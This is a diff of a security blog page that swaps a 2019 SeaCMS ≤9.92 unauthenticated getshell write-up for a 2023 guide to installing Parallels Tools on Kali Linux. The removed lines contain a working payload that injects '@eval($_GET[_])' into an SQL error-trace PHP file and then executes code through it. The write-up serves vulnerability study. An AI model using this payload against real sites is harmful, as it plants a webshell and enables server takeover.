@@ -12,17 +12,17 @@
     <meta name="author" content="F0rmat" />
     <meta name="keywords" content="专注于信息安全、内网渗透、红队攻防" />
     <meta name="og:site_name" content="F0rmat&#39;s Blog" />
-    <link rel="canonical" href="https://xxe.icu/seacms-front-desk-getshell.html" /><meta property="og:type" content="article" />
-    <meta property="title" content="Seacms&lt;=9.92前台Getshell - F0rmat&#39;s Blog">
-    <meta property="og:title" content="Seacms&lt;=9.92前台Getshell - F0rmat&#39;s Blog">
-    <meta property="twitter:title" content="Seacms&lt;=9.92前台Getshell - F0rmat&#39;s Blog">
-    <meta name="description" content="0x01 前言 好久没发代码审计的文章了，最近挺多事情的，无意中看到90Sec上面有一篇seacms前台的getshell，突然就很感兴趣，之前审计这">
-    <meta property="og:description" content="0x01 前言 好久没发代码审计的文章了，最近挺多事情的，无意中看到90Sec上面有一篇seacms前台的getshell，突然就很感兴趣，之前审计这">
-    <meta property="twitter:description" content="0x01 前言 好久没发代码审计的文章了，最近挺多事情的，无意中看到90Sec上面有一篇seacms前台的getshell，突然就很感兴趣，之前审计这">
+    <link rel="canonical" href="https://xxe.icu/install-parallels-tools-on-kali-linux-2023.3.html" /><meta property="og:type" content="article" />
+    <meta property="title" content="Kali Linux 2023.3安装Parallels Tools - F0rmat&#39;s Blog">
+    <meta property="og:title" content="Kali Linux 2023.3安装Parallels Tools - F0rmat&#39;s Blog">
+    <meta property="twitter:title" content="Kali Linux 2023.3安装Parallels Tools - F0rmat&#39;s Blog">
+    <meta name="description" content="0x00 前言 一年一度的Parallels Tools适配Kali Linux的问题又来了，这次也是因为内核更新然后pd没跟上导致的。 不过论坛也给出了解">
+    <meta property="og:description" content="0x00 前言 一年一度的Parallels Tools适配Kali Linux的问题又来了，这次也是因为内核更新然后pd没跟上导致的。 不过论坛也给出了解">
+    <meta property="twitter:description" content="0x00 前言 一年一度的Parallels Tools适配Kali Linux的问题又来了，这次也是因为内核更新然后pd没跟上导致的。 不过论坛也给出了解">
     <meta property="og:type" content="article">
-    <title>Seacms&lt;=9.92前台Getshell - F0rmat&#39;s Blog</title>
+    <title>Kali Linux 2023.3安装Parallels Tools - F0rmat&#39;s Blog</title>
 
-    <meta property="og:url" content="https://xxe.icu/seacms-front-desk-getshell.html" />
+    <meta property="og:url" content="https://xxe.icu/install-parallels-tools-on-kali-linux-2023.3.html" />
 
     
     <meta property="og:image" content="https://avatars.githubusercontent.com/u/16066632?v=4">
@@ -96,17 +96,17 @@
         
         <div>
     <h1 class="font-bold break-normal text-gray-800 pt-2 pb-2 text-2xl lg:text-3xl dark:text-gray-200">
-        <a href="https://xxe.icu/seacms-front-desk-getshell.html" title="Seacms&lt;=9.92前台Getshell">Seacms&lt;=9.92前台Getshell</a>
+        <a href="https://xxe.icu/install-parallels-tools-on-kali-linux-2023.3.html" title="Kali Linux 2023.3安装Parallels Tools">Kali Linux 2023.3安装Parallels Tools</a>
     </h1>
     <p class="mb-1 text-sm text-gray-500 dark:text-gray-200">
-        <span title=" 2019-09-27 01:01:30 UTC">
-            <i class="iconfont icon-calendar" aria-hidden="true"></i> 27 Sep 2019
+        <span title=" 2023-10-14 01:00:00 &#43;0200">
+            <i class="iconfont icon-calendar" aria-hidden="true"></i> 14 Oct 2023
         </span>
 
         <span class="hidden xl:inline-block">
             |
             <i class="iconfont icon-book"></i>
-            603 字
+            806 字
         </span>
 
         <span class="hidden xl:inline-block">
@@ -124,10 +124,14 @@
     <div class="sticky text-sm" style="top:6em;" id="menu-content">
         <nav id="TableOfContents">
   <ul>
-    <li><a href="#0x01-前言">0x01 前言</a></li>
-    <li><a href="#0x02-漏洞复现">0x02 漏洞复现</a></li>
-    <li><a href="#0x03-漏洞分析">0x03 漏洞分析</a></li>
-    <li><a href="#0x04-结束">0x04 结束</a></li>
+    <li><a href="#0x00-前言">0x00 前言</a></li>
+    <li><a href="#0x01-解决问题">0x01 解决问题</a>
+      <ul>
+        <li><a href="#1环境">1、环境</a></li>
+        <li><a href="#2解决过程">2、解决过程</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x02-总结">0x02 总结</a></li>
   </ul>
 </nav>
     </div>
@@ -135,27 +139,76 @@
         </div> 
 
         <div class="post-content dark:text-gray-300">
-            <h1 id="0x01-前言">0x01 前言</h1>
-<p>好久没发代码审计的文章了，最近挺多事情的，无意中看到90Sec上面有一篇seacms前台的getshell，突然就很感兴趣，之前审计这套程序的时候也审计了一下，后面太多事情就搁置了。</p>
-<h1 id="0x02-漏洞复现">0x02 漏洞复现</h1>
-<p>环境是phpstudy（最近出后门新闻最火的那个），用着也挺方便的。PHP版本是5.x的。
-payload：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/comment/api/index.php?gid=1&amp;page=2&amp;rlist[]=*hex/@eval($_GET[_]);?%3E
-</span></span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms-front/1.png" alt="">
-然后访问：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/data/mysqli_error_trace.php?_=phpinfo();
-</span></span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms-front/2.png" alt=""></p>
-<h1 id="0x03-漏洞分析">0x03 漏洞分析</h1>
-<p>关于这个SQL注入报错的地方，在之前的8.7的一篇文章里面分析过了https://getpass.cn/2019/03/04/Seacms8.7-sql-injection-analysis/</p>
-<p>主要的地方还是在于<code>include/sql.class.php</code>这个文件的465-489行</p>
-<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms-front/3.png" alt=""></p>
-<p>它会将sql报错的信息写入了一个PHP的文件里，那我们可以就可以让sql语句报错然后将恶意语句写这个文件利用了。</p>
-<h1 id="0x04-结束">0x04 结束</h1>
-<p>其实这个漏洞还挺简单的，但是在其他的版本代码是不一样的，我测试了9.2的还有之前写SQL注入的8.7版本都是不能利用的。主要代码如下：
-<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms-front/4.png" alt=""></p>
-<p>这里是说如果我们要删除第476行的两个反斜杠，然后才可以显示报错的内容。我想是在很久之前的版本是直接写入PHP文件的，但是后面作为更新了，就加上这段代码，然后将之前的PHP存在的就删除掉。
-但是这个说是9.92版本出现的就很奇怪了。em&hellip;</p>
-<p>文章测试的9.92版本程序下载地址：https://www.lanzous.com/i6eupwh</p>
+            <h1 id="0x00-前言">0x00 前言</h1>
+<p>一年一度的Parallels Tools适配Kali Linux的问题又来了，这次也是因为内核更新然后pd没跟上导致的。</p>
+<p>不过论坛也给出了解决的方案，按照文章当中也遇到了一些问题，遂写一篇解决问题的过程文章。</p>
+<h1 id="0x01-解决问题">0x01 解决问题</h1>
+<h2 id="1环境">1、环境</h2>
+<ul>
+<li>macOS Monterey 13.6（intel）</li>
+<li>Parallels Desktop 19</li>
+<li>Kali Linux 2023.3 (linux-headers-6.5)</li>
+</ul>
+<h2 id="2解决过程">2、解决过程</h2>
+<p>更新源：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">apt-get update
+</span></span></code></pre></div><p>挂载parallels tools并移动到桌面：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cp -R /media/cdrom0/ ~/Desktop/pdtools/
+</span></span></code></pre></div><p>安装</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./install
+</span></span></code></pre></div><p>这个时候就开始出错了，因为之前报错的log:</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231014171247577.png" alt="image-20231014171247577"></p>
+<blockquote>
+<p>如果已经更新了6.5的版本可以重启到启动解决，选择高级-&gt;选择6.3的版本进行启动然后按照下面的步骤进行。</p>
+</blockquote>
+<p>按照文章当中步骤不太一样，因为我环境是intel，所以要改一下</p>
+<p><a href="https://forum.parallels.com/threads/kali-linux-upgrade-boot-kernel-panic.361436/">https://forum.parallels.com/threads/kali-linux-upgrade-boot-kernel-panic.361436/</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">apt remove linux-headers-6.5.0-kali2-amd64 linux-image-6.5.0-kali2-amd64 linux-headers-6.5.0-kali2-common linux-kbuild-6.5.0-kali2
+</span></span></code></pre></div><p>但是呢，我是找不到文章步骤当中的文件路径，这个我是安装成功才看到的：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/var/lib/dkms/parallels-tools/19.0.0.54570/source
+</span></span></code></pre></div><p>我就用之前的方法，把pdtools的文件复制出来：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cp -R /media/cdrom0/ ~/Desktop/pdtools/
+</span></span></code></pre></div><p>解压kmods里面的压缩包,并删除之前的压缩包:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tar -xzf prl_mod.tar.gz
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">rm prl_mod.tar.gz
+</span></span></code></pre></div><p>最后按照文章给出的补丁进行修复：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">patch -p1 parallels-tools_kernel_6_5_0.txt
+</span></span></code></pre></div><blockquote>
+<p>-p1 是表示忽略第一层目录</p>
+</blockquote>
+<p>但是执行会停留在那里不动，可以使用以下的命令进行：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">patch -p1 &lt; parallels-tools_kernel_6_5_0.txt
+</span></span></code></pre></div><p>然后重新打包：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tar -zcvf prl_mod.tar.gz . dkms.conf Makefile.kmods
+</span></span></code></pre></div><p>下面是6.3.0内核的安装方法</p>
+<p>我们直接执行<code>./install</code> 一般会出现系统缺少了<code>dkms</code>和<code>linux-header</code>，可以使用下面的命令进行安装：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">apt install dkms
+</span></span></code></pre></div><p>但安装头文件的时候就出问题了，我们可以直接去找软件包进行安装：</p>
+<p><a href="http://old.kali.org/kali/pool/main/l/linux/">http://old.kali.org/kali/pool/main/l/linux/</a></p>
+<p>下载以下的文件</p>
+<ul>
+<li><a href="https://old.kali.org/kali/pool/main/l/linux/linux-headers-6.3.0-kali1-amd64_6.3.7-1kali1_amd64.deb">linux-headers-6.3.0-kali1-amd64_6.3.7-1kali1_amd64.deb</a></li>
+</ul>
+<p>使用dpkg -i安装就完事了：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">dpkg -i linux-headers-6.3.0-kali1-amd64_6.3.7-1kali1_amd64.deb
+</span></span></code></pre></div><p>但是过程中也会缺席一些文件，也是从上面的网址下载对应的版本文件，然后dpkg安装，如果出现一些安装错误，可以使用下面的命令修复然后重新dpkg安装：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">apt install -f
+</span></span></code></pre></div><p>我一共下载安装了以下一些文件：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">linux-compiler-gcc-12-x86_6.3.7-1kali1_amd64.deb
+</span></span><span class="line"><span class="cl">linux-headers-6.3.0-kali1-amd64_6.3.7-1kali1_amd64.deb
+</span></span><span class="line"><span class="cl">linux-headers-6.3.0-kali1-common_6.3.7-1kali1_all.deb
+</span></span><span class="line"><span class="cl">linux-kbuild-6.3_6.3.7-1kali1_amd64.deb
+</span></span></code></pre></div><p>最后重新执行以安装文件：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./install
+</span></span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231014172436253.png" alt="image-20231014172436253"></p>
+<p>最后把内核更新到6.5即可：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">apt update
+</span></span><span class="line"><span class="cl">apt upgrade
+</span></span><span class="line"><span class="cl">apt install linux-headers-6.5.0-kali2-amd64 linux-image-6.5.0-kali2-amd64 linux-headers-6.5.0-kali2-common linux-kbuild-6.5.0-kali2
+</span></span></code></pre></div><p>重启就可以正常使用了～</p>
+<h1 id="0x02-总结">0x02 总结</h1>
+<p>每次安装新版kali都会遇到的问题，不过有了之前的经验，可以举一反三解决问题，要不然按照文章当中始终没能找到那个目录就没办法继续进行下去了。</p>
 
 
             <hr class="bg-gray-300 mt-8">
@@ -172,7 +225,7 @@ payload：</p>
             </li>
             <li style="word-break:break-all">
                 <strong>原文链接：</strong>
-                <a href="https://xxe.icu/seacms-front-desk-getshell.html">https://xxe.icu/seacms-front-desk-getshell.html</a>
+                <a href="https://xxe.icu/install-parallels-tools-on-kali-linux-2023.3.html">https://xxe.icu/install-parallels-tools-on-kali-linux-2023.3.html</a>
             </li>
             <li>
                 <strong>版权声明：</strong>本作品采用
@@ -189,24 +242,8 @@ payload：</p>
         
         <div class="text-base md:text-sm text-gray-500 pt-6">
                 <a class="inline-block bg-gray-200 rounded-full px-3 py-1 text-sm font-semibold text-gray-700 mr-2 hover:bg-gray-300"
-                    href="https://xxe.icu/tags/%E6%BC%8F%E6%B4%9E.html">
-                    #漏洞
-                </a>
-                <a class="inline-block bg-gray-200 rounded-full px-3 py-1 text-sm font-semibold text-gray-700 mr-2 hover:bg-gray-300"
-                    href="https://xxe.icu/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.html">
-                    #代码审计
-                </a>
-                <a class="inline-block bg-gray-200 rounded-full px-3 py-1 text-sm font-semibold text-gray-700 mr-2 hover:bg-gray-300"
-                    href="https://xxe.icu/tags/php.html">
-                    #php
-                </a>
-                <a class="inline-block bg-gray-200 rounded-full px-3 py-1 text-sm font-semibold text-gray-700 mr-2 hover:bg-gray-300"
-                    href="https://xxe.icu/tags/seacms.html">
-                    #Seacms
-                </a>
-                <a class="inline-block bg-gray-200 rounded-full px-3 py-1 text-sm font-semibold text-gray-700 mr-2 hover:bg-gray-300"
-                    href="https://xxe.icu/tags/getshell.html">
-                    #getshell
+                    href="https://xxe.icu/tags/kali-linux.html">
+                    #Kali Linux
                 </a>
                                     
             </div>
@@ -249,15 +286,15 @@ payload：</p>
 <div class="p-8 mt-6 lg:mt-0 rounded shadow bg-white dark:bg-gray-800">
     <h2 class="font-sans font-bold break-normal text-gray-700 px-2 pb-3 text-xl dark:text-gray-300">相关文章</h2>
     
-    <li><a href="/dedecms-v5.7-sp2-background-getshell-code-execution-vulnerability.html" class="underline text-yellow-600">DedeCMS V5.7 SP2后台Getshell 代码执行漏洞(每日一洞)</a></li>
+    <li><a href="/install-parallels-tools-on-kali-linux-2022.2.html" class="underline text-yellow-600">Kali Linux 2022.2安装Parallels Tools</a></li>
     
-    <li><a href="/metinfo5.3.19-installation-process-is-not-strict-lead-to-getshell.html" class="underline text-yellow-600">MetInfo5.3.19安装过程过滤不严导致Getshell(每日一洞)</a></li>
+    <li><a href="/install-parallels-tools-on-kali-linux-2020.4.html" class="underline text-yellow-600">Kali Linux 2020.4安装Parallels Tools</a></li>
     
-    <li><a href="/zzcms8.2-any-file-deleted-to-getshell.html" class="underline text-yellow-600">ZZCMS8.2任意文件删除至getshell(每日一洞)</a></li>
+    <li><a href="/pd-chrome-3d.html" class="underline text-yellow-600">关于Kali2020安装Parallels Tools后Chrome显示空白</a></li>
     
-    <li><a href="/seacms-v6.54-and-v6.55-front-desk-getshell-code-execution-vulnerability-one-hole-a-day.html" class="underline text-yellow-600">SeaCMS v6.54和v6.55前台Getshell 代码执行漏洞(每日一洞)</a></li>
+    <li><a href="/when_the_cve-2022-35914_vulnerability_encounters_the_disable_function.html" class="underline text-yellow-600">当CVE-2022-35914漏洞遇到disable function</a></li>
     
-    <li><a href="/seacms-v6.45-front-desk-getshell-code-execution-vulnerability-one-hole-a-day.html" class="underline text-yellow-600">SeaCMS v6.45前台Getshell 代码执行漏洞(每日一洞)</a></li>
+    <li><a href="/develop_awvs_api_tools_using_go_language.html" class="underline text-yellow-600">使用GO语言开发AWVS API工具</a></li>
     
 </div>
 
@@ -373,10 +410,14 @@ payload：</p>
     <div class="sticky text-sm" style="top:6em;" id="menu-content">
         <nav id="TableOfContents">
   <ul>
-    <li><a href="#0x01-前言">0x01 前言</a></li>
-    <li><a href="#0x02-漏洞复现">0x02 漏洞复现</a></li>
-    <li><a href="#0x03-漏洞分析">0x03 漏洞分析</a></li>
-    <li><a href="#0x04-结束">0x04 结束</a></li>
+    <li><a href="#0x00-前言">0x00 前言</a></li>
+    <li><a href="#0x01-解决问题">0x01 解决问题</a>
+      <ul>
+        <li><a href="#1环境">1、环境</a></li>
+        <li><a href="#2解决过程">2、解决过程</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x02-总结">0x02 总结</a></li>
   </ul>
 </nav>
     </div>
